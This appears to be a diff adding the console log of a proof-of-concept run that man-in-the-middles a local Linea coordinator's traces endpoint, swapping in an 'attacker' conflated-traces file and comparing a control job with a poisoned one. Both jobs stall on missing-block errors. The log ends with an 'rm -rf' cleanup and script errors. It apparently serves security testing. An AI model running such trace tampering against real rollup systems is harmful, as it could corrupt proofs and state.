@@ -1,0 +1,98 @@
+[+] RPC=http://10.10.10.106:9546/ GW=10.10.10.1 BESU=http://10.10.10.5:8545 SHOMEI=http://11.11.11.107:8888 HEAD=279 RANGE=278..279
+[+] MITM traces :12347 (tamper /pf) | MITM shomei :12348 (passthrough+log)
+
+[1] CONTROL job (endpoint 100% asli):
+    {"jsonrpc":"2.0","id":1,"result":["278-279--431954812"]}
+[2] POISON job (traces=/pf, shomei=passthrough):
+    {"jsonrpc":"2.0","id":1,"result":["278-279-611205263"]}
+    CTRL=278-279--431954812 POISON=278-279-611205263
+
+[3] Poll 360s:
+    30s ctrl=- poison=-
+    60s ctrl=- poison=-
+    90s ctrl=- poison=-
+    120s ctrl=- poison=-
+    150s ctrl=- poison=-
+    180s ctrl=- poison=-
+    210s ctrl=- poison=-
+    240s ctrl=- poison=-
+    270s ctrl=- poison=-
+    300s ctrl=- poison=-
+    330s ctrl=- poison=-
+    360s ctrl=- poison=-
+
+[4] EVIDENCE
+(a) SHOMEI REQ/RESP (data yang belum pernah terlihat):
+    REQ : {"jsonrpc":"2.0","id":58,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":58,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":60,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":60,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":58,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":58,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":60,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":60,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":58,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":58,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":60,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":60,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":58,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":58,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":60,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":60,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":58,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":58,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":60,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":60,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":58,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":58,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":60,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":60,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":64,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":64,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":64,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":64,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+    REQ : {"jsonrpc":"2.0","id":66,"method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":278,"endBlockNumber":279}]}
+    RESP: {"jsonrpc":"2.0","id":66,"error":{"message":"BLOCK_MISSING_IN_CHAIN - block 278 is missing","code":-32602}}
+
+(b) TRACES MITM (tamper):
+    >> /pf linea_getBlockTracesCountersV2 
+       resp: {"jsonrpc":"2.0","id":1,"result":{"tracesEngineVersion":"linea-0f74f55","blockNumber":278,"tracesCounters":{"EXT":0,"ADD":0,"LOG_INFO":3,"BLS_DATA":15,"MXP":5,"TXN_DATA":43,"WCP":39,"ROM_LEX":1,"PRECOMPILE_BLAKE_ROUNDS":0,"BLOCK_L1_SIZE":432,"LOG_DAT
+    >> /pf linea_getBlockTracesCountersV2 
+       resp: {"jsonrpc":"2.0","id":2,"result":{"tracesEngineVersion":"linea-0f74f55","blockNumber":279,"tracesCounters":{"EXT":0,"ADD":0,"LOG_INFO":3,"BLS_DATA":15,"MXP":5,"TXN_DATA":43,"WCP":39,"ROM_LEX":1,"PRECOMPILE_BLAKE_ROUNDS":0,"BLOCK_L1_SIZE":432,"LOG_DAT
+    >> /pf linea_getBlockTracesCountersV2 
+       resp: {"jsonrpc":"2.0","id":3,"result":{"tracesEngineVersion":"linea-0f74f55","blockNumber":280,"tracesCounters":{"EXT":0,"ADD":0,"LOG_INFO":3,"BLS_DATA":15,"MXP":5,"TXN_DATA":43,"WCP":39,"ROM_LEX":1,"PRECOMPILE_BLAKE_ROUNDS":0,"BLOCK_L1_SIZE":432,"LOG_DAT
+    >> /pf linea_generateConflatedTracesToFileV2 [TAMPER -> /data/traces/v2/conflated/P171788709393.attacker.lt.gz]
+       resp: {"jsonrpc": "2.0", "id": 4, "result": {"tracesEngineVersion": "attacker-1", "conflatedTracesFileName": "/data/traces/v2/conflated/P171788709393.attacker.lt.gz"}}
+    >> /pf linea_generateConflatedTracesToFileV2 [TAMPER -> /data/traces/v2/conflated/P171788709393.attacker.lt.gz]
+       resp: {"jsonrpc": "2.0", "id": 5, "result": {"tracesEngineVersion": "attacker-1", "conflatedTracesFileName": "/data/traces/v2/conflated/P171788709393.attacker.lt.gz"}}
+    >> /pf linea_generateConflatedTracesToFileV2 [TAMPER -> /data/traces/v2/conflated/P171788709393.attacker.lt.gz]
+       resp: {"jsonrpc": "2.0", "id": 6, "result": {"tracesEngineVersion": "attacker-1", "conflatedTracesFileName": "/data/traces/v2/conflated/P171788709393.attacker.lt.gz"}}
+    >> /pf linea_generateConflatedTracesToFileV2 [TAMPER -> /data/traces/v2/conflated/P171788709393.attacker.lt.gz]
+       resp: {"jsonrpc": "2.0", "id": 7, "result": {"tracesEngineVersion": "attacker-1", "conflatedTracesFileName": "/data/traces/v2/conflated/P171788709393.attacker.lt.gz"}}
+    >> /pf linea_generateConflatedTracesToFileV2 [TAMPER -> /data/traces/v2/conflated/P171788709393.attacker.lt.gz]
+
+(c) Job status:
+    {"jsonrpc":"2.0","id":1,"result":["IN_PROGRESS","IN_PROGRESS"]}
+(d) Request files:
+  job 278-279--431954812:
+  job 278-279-611205263:
+
+(e) Log job (non-config, error terakhir):
+  --- job 278-279--431954812:
+    time=2026-09-06T15:48:41,519Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+    time=2026-09-06T15:48:47,637Z level=WARN message=conflation and proof creation flow failed batch=[278..279]2 will retry in backOff=5s errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOC
+    time=2026-09-06T15:48:52,528Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+    time=2026-09-06T15:49:02,649Z level=WARN message=conflation and proof creation flow failed batch=[278..279]2 will retry in backOff=5s errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOC
+    time=2026-09-06T15:49:03,547Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+    time=2026-09-06T15:49:14,565Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+  --- job 278-279-611205263:
+    time=2026-09-06T15:48:48,272Z level=WARN message=conflation and proof creation flow failed batch=[278..279]2 will retry in backOff=5s errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOC
+    time=2026-09-06T15:48:53,350Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+    time=2026-09-06T15:49:03,301Z level=WARN message=conflation and proof creation flow failed batch=[278..279]2 will retry in backOff=5s errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOC
+    time=2026-09-06T15:49:04,383Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+    time=2026-09-06T15:49:15,408Z level=WARN message=Error handling blob from BlobCompressionProofCoordinator queue: blob=[278..279]2 errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOCK_MI
+    time=2026-09-06T15:49:18,328Z level=WARN message=conflation and proof creation flow failed batch=[278..279]2 will retry in backOff=5s errorMessage=net.consensys.linea.jsonrpc.JsonRpcErrorResponseException: code=-32602 message=BLOC
+
+Cleanup: docker restart coordinator; rm -rf /workspaces/lineth-monorepo/tmp/local/conflation-backtesting/*
+./poc.sh: line 138: GAPEOF: command not found
+chmod: cannot access 'poc17.sh': No such file or directory
